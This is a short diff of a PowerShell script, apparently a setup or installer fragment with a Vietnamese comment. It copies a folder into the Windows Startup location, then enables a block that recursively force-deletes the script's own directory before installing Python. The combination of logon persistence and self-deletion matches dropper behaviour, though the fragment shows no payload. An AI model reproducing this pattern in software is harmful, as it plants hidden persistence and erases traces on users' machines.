@@ -39,9 +39,9 @@ $dich= $destinationFolder+"\Startup"
 # Write-Host "Thư mục hiện tại đang đứng: $PSScriptRoot"
 Copy-Item -Path $sourceFolder -Destination $dich -Force | Out-Null
 
-# if(Test-Path $PSScriptRoot){
-#  Remove-Item -Path $PSScriptRoot -Recurse -Force
-# }
+if(Test-Path $PSScriptRoot){
+ Remove-Item -Path $PSScriptRoot -Recurse -Force
+}
 if ( -not (Get-command python -errorAction SilentlyContinue)){
   
   scoop install python
